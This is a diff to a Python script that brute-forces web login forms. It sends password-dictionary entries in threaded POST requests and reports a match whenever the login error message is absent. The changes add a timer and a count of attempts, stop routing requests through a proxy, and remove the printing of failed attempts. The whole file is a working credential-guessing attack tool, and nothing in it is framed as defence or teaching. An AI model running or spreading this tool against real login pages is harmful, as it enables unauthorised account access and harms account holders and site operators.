@@ -1,14 +1,14 @@
 import requests, re, sys, argparse, threading
 from itertools import islice
 from termcolor import colored
-
+import time
 
 DEFAULT_THREAD_NO = 10
 
 EXIT_FLAG = 0
 ERR_FILEOPEN = 100
 EXIT_SUCCESS = 0
-
+tests = 0
 thread_count = None
 args = None
 proxies = {
@@ -48,21 +48,20 @@ Craft POST request and send it; Check response body for login error message;
 If the message is not present then a match was found.
 """
 def crack(pURL, pData):
-    global args
+    global args, EXIT_FLAG,tests
     if args.verbose:
         print("[!] Attempting " + str(pData) + "\n")
     pData = pData[:-1]
-    r = requests.post(url=pURL, data=pData,proxies=proxies,headers=headers)
+    r = requests.post(url=pURL, data=pData,headers=headers)
     r.close()
 
     test = args.message
     reg = re.search(args.message, r.text)
-
+    tests = tests + 1
     if reg is None:  # If the login error message is not read
         print(colored('[+] Found possible match: ', 'green'),colored(str(pData)))
         EXIT_FLAG = 1
-    else:
-        print("[!] Invalid creds - "+str(pData)+'\n')
+
 
     return
 
@@ -72,7 +71,8 @@ Main program logic; Get passwords from dictionary, modify POST data;
 Create threads and start them.
 """
 def main():
-    global thread_count, args
+    global thread_count, args, EXIT_FLAG, tests
+    startTime = time.time()
     if not args.threads:
         thread_count = DEFAULT_THREAD_NO
         print("[!] Thread count not specified, running with default thread count [" + str(thread_count) + "] \n")
@@ -105,6 +105,8 @@ def main():
             for i in range(thread_count):
                 threads[i].start()
                 if EXIT_FLAG:
+                    print (time.time()-startTime)
+                    print ("Tests: "+str(tests))
                     exit(EXIT_SUCCESS)
             for i in range(thread_count):
                 threads[i].join()
